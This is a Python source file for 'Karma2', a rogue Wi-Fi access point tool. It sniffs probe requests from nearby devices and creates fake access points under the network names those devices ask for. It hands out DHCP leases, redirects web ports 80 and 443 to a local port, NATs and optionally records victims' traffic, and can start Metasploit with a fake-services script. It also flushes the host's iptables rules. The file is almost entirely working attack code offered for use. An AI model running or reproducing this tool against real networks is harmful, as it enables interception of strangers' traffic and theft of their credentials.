#!/usr/bin/env python

from threading import Lock,Thread
import time,random,re,tempfile
import subprocess
from scapy.all import *
from select import select
import argparse
from datetime import datetime
import BaseHTTPServer

DEFAULT = '\033[49m\033[39m'
RED = '\033[91m'
BRED = '\033[101m'
DRED = '\033[107m\033[41m'
BLUE = '\033[94m'
DBLUE = '\033[107m\033[44m'
GREEN = '\033[92m'
DGREEN = '\033[107m\033[42m'
YELLOW = '\033[93m'

def _ctxt(txt,color):
  return ''.join((color,txt,DEFAULT))


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-g", "--gateway", help="Choose the router IP address. Example: -g 192.168.0.1")
    parser.add_argument("-m", "--monitor", help="Choose the monitor interface")
    parser.add_argument("-e", "--enable", help="Choose the monitor interface to enable")
    parser.add_argument("-a", "--hostapds", help="List of interfaces which will be used to create aps")
    parser.add_argument("-n", "--name", help="start only this given essid")
    parser.add_argument("-f", "--framework", help="path to the metasploit console")
    parser.add_argument("-t", "--tcpdump", action='store_true', help="run tcpdump on interface")
    return parser.parse_args()

class Karma2:

  FORBIDDEN_APS = ('ottersHQ','forYourOttersOnly')

  class Webserver(Thread):
    daemon=True
    def __init__(self):
      Thread.__init__(self)

    def run(self):
      print "run server"
      server_class=Karma2.HTTPServer
      handler_class=Karma2.HTTPRequestHandler
      server_address = ('', 80)
      httpd = server_class(server_address, handler_class)
      httpd.serve_forever()

  class HTTPServer(BaseHTTPServer.HTTPServer):
    pass

  class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
      self.send_response(200)
      self.end_headers()

  class WLANInterface:
    def __init__(self, iface):
      self.iface = iface
      self.available = True

    def str(self):
      return self.iface

  class WLANInterfaces:
    def __init__(self, ifs):
      self.ifs = [Karma2.WLANInterface(_if) for _if in ifs]

    def get_one(self):
      for iface in self.ifs:
        if iface.available:
          iface.available = False
          return iface
      return None

    def free_one(self, _iface):
      for iface in self.ifs:
        if iface.iface == _iface.iface:
          iface.available = False
          return
      return

  class IPSubnet:
    def __init__(self, base):
      self.base = base

    def range(self):
      return "%s/24"%(self.base%254)

    def gateway(self):
      return self.base%254

    def range_upper(self):
      return self.base%100

    def range_lower(self):
      return self.base%200

  class AccessPoint(Thread):
    def __init__(self, karma, ifhostapd, essid, timeout):
      Thread.__init__(self)
      self.essid = essid
      self.karma = karma
      self.timeout = timeout
      self.ifhostapd = ifhostapd

      self.activity_ts = time.time()

      iface,self.hostapd_process = self.create_hostapd_access_point(essid)
      subnet = self.karma.get_unique_subnet()
      self.setup_iface(iface,subnet)
      # redirect the following ports
      self.setup_redirections(iface,80,8080)
      self.setup_redirections(iface,443,8080)
      self.dhcpd_process = self.start_dhcpd(iface,subnet)
      if self.karma.tcpdump:
        self.start_tcp_dump()

    def start_tcp_dump(self):
      logfile = "wifi-%s-%s.cap"%(self.ifhostapd.str(),datetime.now().strftime("%Y%m%d-%H%M%S"))
      print "[+] Starting tcpdump %s"%logfile
      cmd = ['tcpdump','-i', self.ifhostapd.str(), '-w', logfile]
      p = subprocess.Popen(cmd)
    
    def run(self):
      nclients = 0
      print "[+] now running"
      while True:

        # check timeout
        if nclients == 0 and time.time() - self.activity_ts > self.timeout:
          print "[x] No activity for essid",self.essid,"destroying AP"
          self.dhcpd_process.kill()
          self.dhcpd_process.wait()
          self.hostapd_process.kill()
          self.hostapd_process.wait()
          self.karma.release_ap(self.essid)
          self.karma.ifhostapds.free_one(self.ifhostapd)
          return

        dhcpfd = self.dhcpd_process.stderr.fileno()
        airfd = self.hostapd_process.stdout.fileno()

        rlist,wlist,xlist = select([dhcpfd,airfd],[],[],1)
        if dhcpfd in rlist:
          line = self.dhcpd_process.stderr.readline()
          if len(line) == 0:
            continue
          m = re.match(
            r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*",line)
          if m is not None:
            ip,mac,name = m.groups()
            print "DHCPACK from %s (%s)"%(_ctxt(ip, GREEN),name)
            nclients += 1
          m = re.match(
            r".*([a-zA-Z0-9:]+)*disassociated due to inactivity*",line)
          if m is not None:
            mac = m.groups()
            print "dissociated %s"%mac
            nclients -= 1

        if airfd in rlist:
          line = self.hostapd_process.stdout.readline()
          if len(line) == 0:
            continue
          m = re.match(r".*: STA ([a-zA-Z0-9:]+) IEEE 802.11: authenticated",line)
          if m is not None:
            mac, = m.groups()
            print "Client %s associated to %s"%(_ctxt(mac,GREEN),_ctxt(self.essid,GREEN))

            self.activity_ts = time.time()

    def setup_redirections(self, iface, inport, outport):
      print "[+] Setting up (%s) %d to %d redirection"%(iface,inport,outport)
      cmd = ['iptables',
        '-t', 'nat',
        '-A', 'PREROUTING',
        '-i', iface,
        '-p', 'tcp',
        '--dport', str(inport),
        '-j', 'REDIRECT',
        '--to-port', str(outport),
        ]
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      p.wait()
      return p

    def start_dhcpd(self, iface, subnet):
      # create a temporary file
      print "[+] Starting dhcp server %s %s"%(iface,subnet)
      cmd = ['dnsmasq',
        '-d',
        '--bind-dynamic',
        '-i', iface,
        '-F', '%s,%s'%(subnet.range_lower(),subnet.range_upper()),
        '--dhcp-option=option:router,%s'%(subnet.gateway()),
        '--dhcp-option=option:dns-server,%s'%(subnet.gateway()),
#'-R','--address=/#/%s'%(subnet.gateway())
      ]
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      return p

    def setup_iface(self, iface, subnet):
      print "[+] Uping iface %s w/ subnet %s"%(iface,subnet)
      iprange = "%s"%subnet.range()
      cmd = ["ifconfig",iface,iprange]
      p = subprocess.Popen(cmd)
      p.wait()

    def create_hostapd_access_point(self, essid):
      print "[+] Creating (hostapd) AP %s"%_ctxt(essid,GREEN)

      interface = self.ifhostapd.str()
      channel = random.randint(1,15)

      f = tempfile.NamedTemporaryFile(delete=False)
      f.write("ssid=%s\n"%(essid))
      f.write("interface=%s\n"%(interface))
      f.write("channel=%s\n"%(channel))
      f.close()

      cmd = ["hostapd","-d",f.name]
      p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      return interface,p

    def create_airbase_access_point(self, essid):
      print "[+] Creating (airbase) AP %s"%essid
      cmd = ["airbase-ng",
        "--essid", "%s"%essid,
        "-c","4",
        "-I","2000",
        self.karma.ifmon]
      p = subprocess.Popen(cmd, stdout=subprocess.PIPE)

      while True:
        line = p.stdout.readline()
        m = re.match(r".*Created tap interface (\w+)",line)
        if m is not None:
          iface, = m.groups()
          return iface,p

  def __init__(self, ifgw, ifmon, ifhostapds = None, metasploit = None, tcpdump = None):
    self.ifmon = ifmon
    self.ifgw = ifgw
    self.ifhostapds = Karma2.WLANInterfaces(ifhostapds)
    self.aps = {}
    self.subnets = set(xrange(50,256)) 
    self.clear_iptables()
    self.setup_nat(ifgw)
    self.tcpdump = tcpdump
    if metasploit is not None:
      self.start_metasploit(metasploit)
    
  def start_metasploit(self, console):
    print "[+] Starting metasploit"
    cmd = [console,'-r', 'run_fake_services.rb']
    p = subprocess.Popen(cmd)

  def clear_iptables(self):
    print "[+] Clearing iptables rules"
    cmd = ['iptables','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

    cmd = ['iptables','-t','nat','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def setup_nat(self, iface):
    print "[+] Setting up NAT on %s"%iface
    cmd = ["iptables", 
      "-t","nat",
      "-A","POSTROUTING",
      "-o",iface,
      "-j","MASQUERADE"]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def get_unique_subnet(self):
    a = self.subnets.pop()
    return Karma2.IPSubnet("10.0.%d.%%d"%a)

  def register_ap(self, essid, ap):
    self.aps[essid] = ap

  def release_ap(self, essid):
    self.aps.pop(essid)

  def create_ap(self, essid, timeout = 30):
    iface = self.ifhostapds.get_one()
    if iface is None:
      return
    ap = self.AccessPoint(self, iface, essid, timeout)
    ap.daemon = True
    ap.start()
    self.register_ap(essid,ap)

  def do_sniff(self):
    def _filter(packet):
      if packet.haslayer(Dot11ProbeReq):
        section = packet[Dot11ProbeReq][Dot11Elt]
        # SSID
        if section.ID == 0 and section.info != '':
          
          if (not section.info in self.aps.keys()
            and not section.info in self.FORBIDDEN_APS):
            
            self.create_ap(section.info)
    
    sniff(prn=_filter,store=0)

  def start_webserver(self):
    ws = Karma2.Webserver()
    ws.start()

def get_gw(interface):
    for nw, nm, gw, iface, addr in read_routes():
        if gw != "0.0.0.0":
            return gw

if __name__ == '__main__':

  args = parse_args()
  if args.enable is not None:
    cmd = "airmon-ng start %s"%args.enable
    subprocess.Popen(cmd)
 
  args.hostapds = args.hostapds.split(',')

  km = Karma2(args.gateway, args.monitor, args.hostapds, args.framework, args.tcpdump)

  #km.start_webserver()

  if args.name is not None:
    # 24h timeout
    km.create_ap(args.name, 60*60*24)
  else:
    km.do_sniff()

  while True:
    time.sleep(1)
